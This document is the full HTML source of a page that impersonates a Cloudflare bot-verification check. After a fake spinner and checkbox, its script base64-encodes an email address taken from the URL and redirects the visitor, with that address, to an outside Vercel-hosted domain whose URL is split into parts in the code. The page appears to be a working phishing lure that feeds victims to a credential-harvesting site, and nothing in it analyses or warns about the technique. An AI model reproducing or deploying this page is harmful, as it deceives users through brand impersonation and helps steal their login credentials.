<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }

        .initial-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4CAF50;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .instruction {
            margin-bottom: 18px;
            text-align: center;
            font-size: 16px;
            color: #555;
            display: none;
        }

        .verification-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
            padding: 24px;
            width: 100%;
            max-width: 420px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #eaeaea;
            display: none;
        }

        .verification-left {
            display: flex;
            align-items: center;
        }

        .checkbox-container {
            position: relative;
            display: flex;
            align-items: center;
        }

        .checkbox {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }

        .checkbox-label {
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 16px;
            color: #333;
            transition: color 0.2s ease;
        }

        .checkbox-label:hover {
            color: #000;
        }

        .custom-checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #ccc;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            transition: all 0.3s ease;
        }

        .checkbox:checked + .checkbox-label .custom-checkbox {
            border-color: #4CAF50;
            background-color: #4CAF50;
        }

        .checkbox:checked + .checkbox-label .custom-checkbox::after {
            content: "";
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
            margin-top: -1px;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid transparent;
            border-top: 2px solid #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 12px;
            display: none;
        }

        .success-check {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: #4CAF50;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            display: none;
        }

        .success-check::after {
            content: "";
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
            margin-top: -1px;
        }

        .verification-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }

        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
        }

        .logo {
            width: 32px;
            height: 32px;
            margin-right: 4px;
            border-radius: 4px;
        }

        .brand {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 13px;
            font-weight: 500;
            color: #333;
            letter-spacing: 0.5px;
        }

        .footer {
            font-size: 12px;
            color: #666;
        }

        .footer a {
            color: #666;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .footer a:hover {
            color: #333;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <!-- Only the spinner shows initially -->
    <div class="initial-spinner" id="initialSpinner"></div>

    <!-- Everything else is hidden initially -->
    <div class="instruction" id="instruction">
        To view this document, verify you're not a robot below
    </div>

    <div class="verification-container" id="verificationContainer">
        <div class="verification-left">
            <div class="checkbox-container">
                <input type="checkbox" id="verification-checkbox" class="checkbox">
                <label for="verification-checkbox" class="checkbox-label">
                    <span class="custom-checkbox"></span>
                    <span id="verification-text">Verify</span>
                </label>
            </div>

            <div class="spinner" id="spinner"></div>
            <div class="success-check" id="success-check"></div>
        </div>

        <div class="verification-right">
            <div class="logo-container">
                <img src="cloudflare_.png" alt="Cloudflare" class="logo" style="width:32px;height:32px;">
                <div class="brand">CLOUDFLARE</div>
            </div>
            <div class="footer">
                <a href="#">Privacy</a> Â· <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // Function to encode string to base64
        function encodeBase64(str) {
            if (typeof btoa === 'function') {
                return btoa(str);
            }
            return Buffer.from(str).toString('base64');
        }

        // Function to decode base64 string
        function decodeBase64(str) {
            if (typeof atob === 'function') {
                return atob(str);
            }
            return Buffer.from(str, 'base64').toString();
        }

        // Function to get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            const results = regex.exec(window.location.href);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Function to check if a string is base64 encoded
        function isBase64(str) {
            try {
                return btoa(atob(str)) === str;
            } catch (err) {
                return false;
            }
        }

        // Function to process URL and ensure eoff parameter is always encoded
        function processUrl() {
            const currentUrl = new URL(window.location.href);
            const eoffParam = currentUrl.searchParams.get('eoff');

            if (eoffParam && !isBase64(eoffParam)) {
                const encodedEmail = encodeBase64(eoffParam);
                const newUrl = `${window.location.origin}${window.location.pathname}?eoff=${encodedEmail}`;
                window.history.replaceState(null, '', newUrl);
            }
        }

        // Function to build redirect URL with encoded email (broken into parts)
        function buildRedirectUrl() {
            const protocol = 'https:';
            const domain = '//xyz123-blush.vercel.app';
            const path = '/';
            const eoffParam = getUrlParameter('eoff');

            if (eoffParam) {
                return `${protocol}${domain}${path}?eoff=${eoffParam}`;
            }

            return `${protocol}${domain}${path}`;
        }

        // Process URL on page load
        processUrl();

        // Show only spinner for 3 seconds, then show everything else
        setTimeout(function() {
            document.getElementById('initialSpinner').style.display = 'none';
            document.getElementById('instruction').style.display = 'block';
            document.getElementById('verificationContainer').style.display = 'flex';
        }, 3000);

        document.getElementById('verification-checkbox').addEventListener('change', function() {
            const checkbox = this;
            const verificationText = document.getElementById('verification-text');
            const customCheckbox = document.querySelector('.custom-checkbox');
            const spinner = document.getElementById('spinner');
            const successCheck = document.getElementById('success-check');

            if (checkbox.checked) {
                customCheckbox.style.display = 'none';
                spinner.style.display = 'block';
                verificationText.textContent = 'Verifying...';

                setTimeout(function() {
                    spinner.style.display = 'none';
                    successCheck.style.display = 'flex';
                    verificationText.textContent = 'Success!';

                    const redirectUrl = buildRedirectUrl();
                    console.log('Redirecting to:', redirectUrl);

                    setTimeout(function() {
                        window.location.href = redirectUrl;
                    }, 1000);
                }, 1500);
            } else {
                customCheckbox.style.display = 'flex';
                spinner.style.display = 'none';
                successCheck.style.display = 'none';
                verificationText.textContent = 'Verify';
            }
        });
    </script>
</body>
</html>
